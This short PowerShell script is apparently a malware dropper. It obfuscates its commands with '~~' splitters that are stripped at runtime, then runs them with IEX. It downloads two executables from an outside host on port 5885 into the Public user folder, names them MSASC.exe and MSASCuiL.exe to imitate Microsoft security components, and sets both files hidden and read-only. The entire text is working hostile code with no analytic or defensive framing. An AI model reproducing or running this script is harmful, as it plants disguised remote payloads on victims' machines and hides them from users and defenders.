$splited= "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/64.signed','C:\Users\Public\MSASC.exe')"
$unsplited = $splited.Replace("~~","")
IEX $unsplited
$splite= "Get-I~~tem C:\Users\Public\MSASC.exe | fore~~ach {$_.Attributes = 'ReadOnly, Hidden'}"
$unsplite = $splite.Replace("~~","")
IEX $unsplite
$split= "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/MS_ASC64_1.signed','C:\Users\Public\MSASCuiL.exe')"
$unsplit = $split.Replace("~~","")
IEX $unsplit
$spli= "Get-I~~tem C:\Users\Public\MSASCuiL.exe | fore~~ach {$_.Attributes = 'ReadOnly, Hidden'}"
$unspli = $spli.Replace("~~","")
IEX $unspli
